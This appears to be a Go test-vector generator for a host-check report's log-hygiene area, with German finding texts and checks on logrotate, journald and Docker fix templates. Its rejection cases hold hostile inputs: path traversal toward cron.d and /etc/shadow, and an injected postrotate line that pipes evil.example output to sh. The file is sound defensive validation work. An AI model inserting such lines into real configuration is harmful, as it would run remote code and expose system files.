//go:build !release

package main

import (
	"github.com/deutschland-schild/schild/contract"
	"github.com/deutschland-schild/schild/contract/hostcheck"
	"github.com/deutschland-schild/schild/contract/vectors"
)

// D38 (initiator, 2026-10-29; MVP-11 addendum "Log-Hygiene"): the host
// check area logs and the typed fix_config {path, content} rendered from a
// gateway-side template. Appended after the storage-bounds vectors.

func fixCfg(id string, vars map[string]string) map[string]any {
	f := hostcheck.RenderFix(hostcheck.FixTemplates[id][0], vars)
	return map[string]any{"path": f.Path, "content": f.Content}
}

func logsFinding(id, subject, severity, title, explanation string, fix any, fc map[string]any, evidence map[string]any) map[string]any {
	f := finding(id, "logs", subject, severity, "finding", title, explanation, fix, evidence)
	if fc != nil {
		f["fix_config"] = fc
	}
	return f
}

// caddyRule is the logrotate fix for Caddy's access log (roll_disabled).
func caddyRule() map[string]any {
	return fixCfg("logs.logrotate_config", map[string]string{"slug": "caddy-access", "file": "/var/log/caddy/access.log", "rotate": "14", "max_size_mb": "200"})
}

func logsReport() map[string]any {
	r := gatewayReport()
	r["findings"] = []any{
		logsFinding("logs.docker_unbounded", "", "medium", "Container-Logs ohne Obergrenze",
			"Die Logs von 3 Containern haben keine Obergrenze. Das größte ist 2,4 GB groß (schild). Mit einer Grenze behält Docker nur die letzten Dateien. Die Grenze gilt für neu gestartete Container, also danach neu deployen.",
			nil, fixCfg("logs.docker_unbounded", map[string]string{"max_size_mb": "10", "max_files": "5"}),
			map[string]any{"source": "docker_container", "count": 3, "size_bytes": 2576980378, "path": "/etc/docker/daemon.json"}),
		logsFinding("logs.journald_size", "", "low", "Das Journal ist groß",
			"Das Journal belegt 4,6 GB (12 % von /). Eine feste Obergrenze hält es kleiner.",
			"sudo systemctl restart systemd-journald", fixCfg("logs.journald_size", map[string]string{"max_use_mb": "1024", "keep_free_mb": "2048"}),
			map[string]any{"source": "journald_conf", "size_bytes": 4939212390, "fs_percent": 12, "mount": "/", "path": "/var/log/journal"}),
		logsFinding("logs.logrotate_config", "/var/log/caddy/access.log", "medium", "Caddy-Log wird nicht richtig rotiert",
			"Caddy schreibt /var/log/caddy/access.log selbst und öffnet die Datei nach dem Umbenennen nicht neu. Ohne copytruncate landet das Log weiter in der alten Datei.",
			nil, caddyRule(), map[string]any{"source": "caddyfile", "path": "/var/log/caddy/access.log", "setting": "roll_disabled"}),
		logsFinding("logs.large_file", "/srv/app/storage/logs/laravel.log", "medium", "Große Logdatei ohne Rotation",
			"/srv/app/storage/logs/laravel.log ist 6,1 GB groß und wächst um etwa 380 MB pro Tag. Keine logrotate-Regel erfasst die Datei.",
			nil, fixCfg("logs.large_file", map[string]string{"slug": "laravel", "file": "/srv/app/storage/logs/laravel.log", "rotate": "7", "max_size_mb": "500"}),
			map[string]any{"source": "stat", "path": "/srv/app/storage/logs/laravel.log", "size_bytes": 6549825126, "growth_bytes_per_day": 398458880, "fs_percent": 16, "mount": "/"}),
		logsFinding("logs.logrotate_stale", "", "low", "logrotate ist länger nicht gelaufen",
			"logrotate ist zuletzt am 24.10.2026 gelaufen. Normal ist einmal am Tag. sudo logrotate -d /etc/logrotate.conf zeigt, woran es hängt.",
			"sudo logrotate -d /etc/logrotate.conf", nil, map[string]any{"source": "logrotate_status", "path": "/var/lib/logrotate/status", "date": "2026-10-24"}),
		finding("logs.logrotate_missing", "logs", "", "info", "ok", "logrotate läuft täglich",
			"Der Timer von logrotate ist aktiv.", nil, map[string]any{"source": "systemd", "enabled": true}),
		unreadableFinding("logs.large_file", "logs", "Logverzeichnis nicht lesbar", "Ein Teil von /var/log ist nur für root lesbar.", "permission_denied", "root",
			map[string]any{"source": "stat", "path": "/var/log/private"}),
	}
	// (id, subject) unique: the unreadable large_file names its subject.
	r["findings"].([]any)[6].(map[string]any)["subject"] = "/var/log/private"
	return r
}

func genHostReportV05Logs(g *gen) {
	const c = "host-report"
	ctx := vectors.Context{}
	add := func(valid bool, code contract.Code, name, desc string, m map[string]any) {
		g.add(c, name, valid, code, desc, ctx, mustJSON(m), nil)
	}
	add(true, "", "logs-area", "D38 (MVP-11 addendum Log-Hygiene): area logs with each finding, evidence size_bytes, growth_bytes_per_day, fs_percent, mount, and fix_config rendered from the gateway templates (daemon.json, journald drop-in, logrotate rules with copytruncate).", logsReport())
	one := func(f map[string]any) map[string]any {
		r := minimalReport()
		r["findings"] = []any{f}
		return r
	}
	base := func(fc map[string]any) map[string]any {
		return one(logsFinding("logs.logrotate_config", "/var/log/caddy/access.log", "medium", "Caddy-Log wird nicht richtig rotiert",
			"Ohne copytruncate landet das Log weiter in der alten Datei.", nil, fc, map[string]any{"source": "caddyfile", "path": "/var/log/caddy/access.log"}))
	}
	add(true, "", "fix-config-www-log", "D38: a log file below /var/www/ ending in .log is a valid template variable.",
		one(logsFinding("logs.large_file", "/var/www/shop/var/log/prod.log", "low", "Große Logdatei ohne Rotation", "Keine logrotate-Regel erfasst die Datei.", nil,
			fixCfg("logs.large_file", map[string]string{"slug": "shop", "file": "/var/www/shop/var/log/prod.log", "rotate": "7", "max_size_mb": "500"}),
			map[string]any{"source": "stat", "path": "/var/www/shop/var/log/prod.log", "size_bytes": 1288490188})))
	add(true, "", "fix-config-bounds", "D38: template numbers at their bounds (rotate 365, max size 10240 MB).",
		base(fixCfg("logs.logrotate_config", map[string]string{"slug": "a", "file": "/var/log/x", "rotate": "365", "max_size_mb": "10240"})))

	bad := func(name, desc string, fc map[string]any) { add(false, contract.CodeSchema, name, desc, base(fc)) }
	fc := caddyRule()
	fc["path"] = "/etc/logrotate.d/../cron.d/schild-x"
	bad("fix-config-path-traversal", "D38: fix_config.path must render the template; a path with .. never does.", fc)
	fc = fixCfg("logs.logrotate_config", map[string]string{"slug": "x", "file": "/var/log/../../etc/shadow", "rotate": "7", "max_size_mb": "500"})
	bad("fix-config-file-traversal", "D38: the log file variable has no segment starting with a dot (no ..), so copytruncate never reaches /etc/shadow.", fc)
	fc = fixCfg("logs.logrotate_config", map[string]string{"slug": "x", "file": "/etc/passwd", "rotate": "7", "max_size_mb": "500"})
	bad("fix-config-file-outside-roots", "D38: a log file outside /var/log/, /srv/, /opt/ and /var/www/ is refused.", fc)
	fc = fixCfg("logs.logrotate_config", map[string]string{"slug": "x", "file": "/srv/app/.env", "rotate": "7", "max_size_mb": "500"})
	bad("fix-config-file-not-log", "D38: outside /var/log/ the file name must end in .log.", fc)
	fc = caddyRule()
	fc["content"] = fc["content"].(string) + "  postrotate\n    curl https://evil.example/x | sh\n  endscript\n"
	bad("fix-config-extra-lines", "D38: content that is not exactly a template rendering (here an added postrotate script) is refused.", fc)
	bad("fix-config-free-content", "D38: free content is never a fix_config.", map[string]any{"path": "/etc/logrotate.d/schild-x", "content": "/var/log/x {\n  daily\n}\n"})
	fc = fixCfg("logs.logrotate_config", map[string]string{"slug": "x", "file": "/var/log/x", "rotate": "0", "max_size_mb": "500"})
	bad("fix-config-number-out-of-range", "D38: numbers within the variable's bounds (rotate 1..365).", fc)
	fc = fixCfg("logs.logrotate_config", map[string]string{"slug": "x", "file": "/var/log/x", "rotate": "07", "max_size_mb": "500"})
	bad("fix-config-number-leading-zero", "D38: numbers without leading zeros.", fc)
	bad("fix-config-other-template", "D38: a template of another finding id does not count (a journald drop-in offered for a logrotate finding).",
		fixCfg("logs.journald_size", map[string]string{"max_use_mb": "1024", "keep_free_mb": "2048"}))
	fc = caddyRule()
	fc["path"] = "/etc/logrotate.d/caddy-access"
	bad("fix-config-overwrites-vendor-file", "D38: logrotate fixes only write files named schild-<slug>, never a vendor file.", fc)
	r := one(finding("ssh.password_authentication", "ssh", "", "medium", "finding", "Passwort-Login ist an", "Schalte ihn ab.", nil, map[string]any{"source": "sshd_t"}))
	firstFinding(r)["fix_config"] = caddyRule()
	add(false, contract.CodeSchema, "fix-config-unknown-id", "D38: a finding id without templates has no fix_config.", r)
	r = one(logsFinding("logs.logrotate_config", "/var/log/caddy/access.log", "info", "Caddy-Log wird rotiert", "Alles in Ordnung.", nil, caddyRule(), map[string]any{"source": "caddyfile"}))
	firstFinding(r)["status"] = "ok"
	add(false, contract.CodeSchema, "fix-config-on-ok", "D38: fix_config only with status finding.", r)
	r = one(logsFinding("logs.logrotate_config", "/var/log/caddy/access.log", "medium", "x", "y", nil, caddyRule(), map[string]any{"source": "caddyfile"}))
	firstFinding(r)["evidence"].(map[string]any)["content"] = "x"
	add(false, contract.CodeForbiddenField, "content-outside-fix-config", "D38: the key content stays forbidden everywhere except fix_config.content.", r)
	r = one(logsFinding("logs.logrotate_config", "/var/log/caddy/access.log", "medium", "x", "y", nil, nil, map[string]any{"source": "caddyfile"}))
	firstFinding(r)["fix_config"] = map[string]any{"path": "/etc/logrotate.d/schild-x", "content": "-----BEGIN RSA PRIVATE KEY-----"}
	add(false, contract.CodeForbiddenContent, "fix-config-secret", "D38: the content detectors still run on fix_config.content (before the template check).", r)
}
